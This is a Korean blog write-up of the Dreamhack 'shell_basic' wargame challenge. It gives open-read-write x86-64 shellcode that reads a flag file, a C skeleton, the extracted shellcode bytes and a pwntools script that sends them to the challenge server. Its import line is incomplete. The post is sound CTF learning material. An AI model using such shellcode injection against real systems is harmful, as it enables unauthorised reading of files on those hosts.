@@ -1,0 +1,178 @@
+---
+title: "[Dreamhack] shell_basic 문제 풀이"
+date: "2024-07-12"
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: 어셈블리어는 어렵다."
+---
+
+## 어셈 코드 작성
+
+일단 코드는 이전 lecture 에서 사용한 orw 쉘코드를 바탕으로 진행했음.
+
+```assembly
+; File name: orw.asm
+section .text
+global _start
+_start:
+push 0x0
+mov rax, 0x676e6f6f6f6f6f6f
+push rax
+mov rax, 0x6c5f73695f656d61
+push rax
+mov rax, 0x6e5f67616c662f63
+push rax
+mov rax, 0x697361625f6c6c65
+push rax
+mov rax, 0x68732f656d6f682f
+push rax
+mov rdi, rsp
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 2
+syscall
+mov rdi, rax
+mov rsi, rsp
+sub rsi, 0x30
+mov rdx, 0x30
+mov rax, 0x0
+syscall
+mov rdi, 1
+mov rax, 0x1
+syscall
+```
+
+## 스켈레톤 코드 작성
+
+```c
+// File name: orw-skeleton.c
+// Compile Option: gcc -o orw-skeleton orw-skeleton.c -masm=intel
+
+__asm__(
+
+".global run_sh\n"
+"run_sh:\n"
+
+"push 0x0\n"
+"mov rax, 0x676e6f6f6f6f6f6f\n"
+"push rax\n"
+"mov rax, 0x6c5f73695f656d61\n"
+"push rax\n"
+"mov rax, 0x6e5f67616c662f63\n"
+"push rax\n"
+"mov rax, 0x697361625f6c6c65\n"
+"push rax\n"
+"mov rax, 0x68732f656d6f682f\n"
+"push rax\n"
+
+"mov rdi, rsp\n"
+"xor rsi, rsi\n"
+"xor rdx, rdx\n"
+"mov rax, 2\n"
+"syscall\n"
+
+"mov rdi, rax\n"
+"mov rsi, rsp\n"
+"sub rsi, 0x30\n"
+"mov rdx, 0x30\n"
+"mov rax, 0x0 \n"
+"syscall\n"
+"mov rdi, 1\n"
+"mov rax, 0x1\n"
+"syscall\n"
+
+"xor rdi, rdi # rdi = 0\n"
+"mov rax, 0x3c # rax = sys_exit\n"
+"syscall # exit(1)");
+
+void run_sh();
+
+int main() { run_sh(); }
+```
+
+위처럼 C언어에 어셈코드 붙여서 스켈레톤 코드 작성.
+하지만 이걸로 해보다가 드림핵 보니까 nasm으로 어셈 코드 직접 컴파일 해서 걍 그렇게 진행함.
+~~이걸로 하루 날림~~
+
+## shellcode 추출
+
+이 부분이 드림핵 lecture 에 설명이 애매모호하게 되어 있어서 구글 잼민이한테 물어봤다.
+
+![](https://i.imgur.com/w0r4Mby.png)
+
+아하 그렇군.
+위에 명령어 대로 진행했다.
+그랬더니...
+
+```hex
+6a00
+48b86f6f6f6f6f
+6f6e67
+50
+48b8616d655f69
+735f6c
+50
+48b8632f666c61
+675f6e
+50
+48b8656c6c5f62
+617369
+50
+48b82f686f6d65
+2f7368
+50
+4889e7
+4831f6
+4831d2
+b802000000
+0f05
+4889c7
+4889e6
+4883ee30
+ba30000000
+b800000000
+0f05
+bf01000000
+b801000000
+0f05
+```
+
+이런 값을 뱉어줬다.
+원래는 파이썬으로 `\x00` 형식으로 바꿔주려다가 코드짜기 귀찮아서 요래요래 해서
+
+```shellcode
+x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05
+```
+
+이처럼 만들어주었다.
+
+그리고 넣어봤는데 익스 실패..
+
+찾아봤는데 pwntools로 넣어보라고 해서 해봤다.
+
+코드는
+
+```python
+from pwn import
+
+p = remote('host1.dreamhack.games', 13670 )
+context.arch = 'amd64'
+
+shellcode = b'\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05'
+
+p.sendlineafter('shellcode: ', shellcode)
+
+print(p.recv())
+
+# shell을 따는게 목적이 아닌 문제라서 p.interactive()는 사용 안함 :)
+```
+
+최종적으로
+![](https://i.imgur.com/TEx5iul.png)
+
+보다시피 익스플로잇 성공!!
+
+## 느낀점
+
+쉘코드를 직접 짜본적이 없었는데 이렇게 직접 어셈 코드 작성해서 성공해서 생각보다 기분이 좋았따..
+~~드릅게 빡시네 이거;;;~~
